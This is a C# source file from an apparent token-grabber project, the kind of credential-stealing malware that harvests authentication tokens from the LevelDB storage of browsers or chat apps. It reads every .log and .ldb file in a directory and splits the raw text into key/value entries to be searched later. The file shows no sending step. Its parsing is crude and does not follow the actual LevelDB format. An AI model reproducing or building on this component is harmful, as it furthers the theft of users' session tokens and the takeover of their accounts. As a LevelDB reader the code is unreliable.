namespace TokenGrabber.Utils;

using System.Text;

internal static class LevelDbParser
{
    public static List<LevelDbEntry> ReadAllEntries(string dbPath)
    {
        var entries = new List<LevelDbEntry>();

        var logFiles = Directory.GetFiles(dbPath, "*.log");
        foreach (var file in logFiles)
        {
            entries.AddRange(ParseLogFile(file));
        }

        var ldbFiles = Directory.GetFiles(dbPath, "*.ldb");
        foreach (var file in ldbFiles)
        {
            entries.AddRange(ParseLdbFile(file));
        }

        return entries;
    }

    private static IEnumerable<LevelDbEntry> ParseLogFile(string path)
    {
        var entries = new List<LevelDbEntry>();
        try
        {
            var content = File.ReadAllText(path, Encoding.UTF8);
            var lines = content.Split('\n');

            foreach (var line in lines)
            {
                if (line.Length < 2) continue;

                var separatorIndex = line.IndexOf(':');
                if (separatorIndex <= 0) continue;

                entries.Add(new LevelDbEntry
                {
                    Key = line[..separatorIndex].Trim(),
                    Value = line[(separatorIndex + 1)..].Trim(),
                    Source = Path.GetFileName(path)
                });
            }
        }
        catch { }

        return entries;
    }

    private static IEnumerable<LevelDbEntry> ParseLdbFile(string path)
    {
        var entries = new List<LevelDbEntry>();
        try
        {
            var bytes = File.ReadAllBytes(path);
            var content = Encoding.UTF8.GetString(bytes);

            var segments = content.Split('\0', StringSplitOptions.RemoveEmptyEntries);
            for (int i = 0; i < segments.Length - 1; i += 2)
            {
                entries.Add(new LevelDbEntry
                {
                    Key = segments[i],
                    Value = segments[i + 1],
                    Source = Path.GetFileName(path)
                });
            }
        }
        catch { }

        return entries;
    }
}

internal sealed class LevelDbEntry
{
    public required string Key { get; init; }
    public required string Value { get; init; }
    public required string Source { get; init; }
}
